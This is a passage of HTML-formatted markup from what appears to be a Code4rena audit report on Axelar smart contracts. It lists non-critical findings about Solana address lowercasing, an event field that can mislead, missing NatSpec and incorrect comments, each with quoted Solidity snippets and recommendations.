class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMintLimiter</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">KEY_MINT_LIMITER</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">KEY_GOVERNANCE</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotMintLimiter</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><code>onlyMintLimiter</code> could be named <code>onlyMintLimiterOrGov</code> since this is what it verifies.</p>\n<h2 id=\"n-01-remoteaddressvalidator_lowercase-will-not-work-for-solana-addresses\" style=\"position:relative;\"><a href=\"#n-01-remoteaddressvalidator_lowercase-will-not-work-for-solana-addresses\" aria-label=\"n 01 remoteaddressvalidator_lowercase will not work for solana addresses permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] <code>RemoteAddressValidator::_lowerCase</code> will not work for Solana addresses</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L54-L61\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L54-L61</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">remote</span><span class=\"mtk1\">-</span><span class=\"mtk12\">address</span><span class=\"mtk1\">-</span><span class=\"mtk12\">validator</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RemoteAddressValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_lowerCase</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">).</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">)[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">65</span><span class=\"mtk1\">) &amp;&amp; (</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">70</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">)[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">bytes1</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk7\">32</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>This converts an address to lowercase (<code>65-70 -> A-F</code>). Solana addresses are <code>base58</code> encoded versions of a 32 byte array. Thus, they first have more letters and converting it to lowercase will make it another address.</p>\n<h3 id=\"recommendation-11\" style=\"position:relative;\"><a href=\"#recommendation-11\" aria-label=\"recommendation 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider changing this before adding Solana as a supported chain.</p>\n<h2 id=\"n-02-interchaingovernance-can-be-abstract\" style=\"position:relative;\"><a href=\"#n-02-interchaingovernance-can-be-abstract\" aria-label=\"n 02 interchaingovernance can be abstract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] <code>InterchainGovernance</code> can be <code>abstract</code></h2>\n<p>As the contract is not complete on its own, I recommend making it <code>abstract</code> to convey that it is supposed to be extended.</p>\n<h2 id=\"n-03-eta-in-proposalcancelled-event-can-be-misleading\" style=\"position:relative;\"><a href=\"#n-03-eta-in-proposalcancelled-event-can-be-misleading\" aria-label=\"n 03 eta in proposalcancelled event can be misleading permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] <code>eta</code> in <code>ProposalCancelled</code> event can be misleading</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/governance/InterchainGovernance.sol#L135\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/governance/InterchainGovernance.sol#L135</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/governance/AxelarServiceGovernance.sol#L94\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/governance/AxelarServiceGovernance.sol#L94</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarServiceGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCancelled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalHash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">callData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\">, </span><span class=\"mtk12\">eta</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The <code>eta</code> here can be misleading, as it might not be the <code>eta</code> of the event. The user can send what they want here and if it is the correct <code>eta</code> that the user used to schedule, it can still have been changed when scheduling the <code>Timelock</code>.</p>\n<h3 id=\"recommendation-12\" style=\"position:relative;\"><a href=\"#recommendation-12\" aria-label=\"recommendation 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Consider either reading the <code>eta</code> before clearing it in <code>_cancelTimeLock</code> or don’t include the <code>eta</code> in the event at all.</p>\n<h2 id=\"n-04-incomplete-natspec\" style=\"position:relative;\"><a href=\"#n-04-incomplete-natspec\" aria-label=\"n 04 incomplete natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Incomplete NatSpec</h2>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L411-L424\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L411-L424</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">411</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributor</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">able</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">and</span><span class=\"mtk1\"> </span><span class=\"mtk12\">burn</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">412</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationChain</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destination</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chain</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deploy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">413</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gasValue</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">native</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">used</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pay</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gas</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remote</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployment</span><span class=\"mtk1\">. </span><span class=\"mtk12\">At</span><span class=\"mtk1\"> </span><span class=\"mtk12\">least</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">414</span><span class=\"mtk1\">:     * </span><span class=\"mtk12\">specified</span><span class=\"mtk1\"> </span><span class=\"mtk12\">needs</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">passed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">415</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">dev</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`gasValue`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exists</span><span class=\"mtk1\"> </span><span class=\"mtk12\">because</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">can</span><span class=\"mtk1\"> </span><span class=\"mtk11\">be</span><span class=\"mtk1\"> </span><span class=\"mtk11\">part</span><span class=\"mtk1\"> </span><span class=\"mtk11\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">a</span><span class=\"mtk1\"> </span><span class=\"mtk11\">multicall</span><span class=\"mtk1\"> </span><span class=\"mtk11\">involving</span><span class=\"mtk1\"> </span><span class=\"mtk11\">multiple</span><span class=\"mtk1\"> </span><span class=\"mtk11\">functions</span><span class=\"mtk1\"> </span><span class=\"mtk11\">that</span><span class=\"mtk1\"> </span><span class=\"mtk11\">could</span><span class=\"mtk1\"> </span><span class=\"mtk11\">make</span><span class=\"mtk1\"> </span><span class=\"mtk11\">remote</span><span class=\"mtk1\"> </span><span class=\"mtk11\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calls</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">416:     </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">417:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployAndRegisterRemoteStandardizedToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">418:        </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">419:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">name</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">420:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">symbol</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">421:        </span><span class=\"mtk10\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk10\">decimals</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">422:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">distributor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">423:        </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">operator</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// &lt;-- operator missing from NatSpec</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">424:        </span><span class=\"mtk10\">string</span><span class=\"mtk1\"> </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">destinationChain</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<p><code>@param operator</code> is missing from NatSpec</p>\n<h2 id=\"n-05-erroneous-comments\" style=\"position:relative;\"><a href=\"#n-05-erroneous-comments\" aria-label=\"n 05 erroneous comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-05] Erroneous comments</h2>\n<h3 id=\"tokenmanagerproxysol\" style=\"position:relative;\"><a href=\"#tokenmanagerproxysol\" aria-label=\"tokenmanagerproxysol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>TokenManagerProxy.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/proxies/TokenManagerProxy.sol#L8-L13\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/proxies/TokenManagerProxy.sol#L8-L13</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenManagerProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">8</span><span class=\"mtk1\">:</span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> 9: * </span><span class=\"mtk4\">@title</span><span class=\"mtk3\"> TokenManagerProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">10: * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> This contract is a proxy for token manager contracts. It implements ITokenManagerProxy and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">11: * inherits from FixedProxy from the gmp sdk repo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">12: */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:</span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenManagerProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ITokenManagerProxy</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>It does not inherit from <code>FixedProxy</code>.</p>\n<h3 id=\"interchainproposalexecutorsol\" style=\"position:relative;\"><a href=\"#interchainproposalexecutorsol\" aria-label=\"interchainproposalexecutorsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainProposalExecutor.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L19-L22\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L19-L22</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">-</span><span class=\"mtk12\">executor</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainProposalExecutor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">: *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">: * </span><span class=\"mtk12\">This</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">abstract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">and</span><span class=\"mtk1\"> </span><span class=\"mtk12\">some</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">its</span><span class=\"mtk1\"> </span><span class=\"mtk12\">functions</span><span class=\"mtk1\"> </span><span class=\"mtk12\">need</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implemented</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span 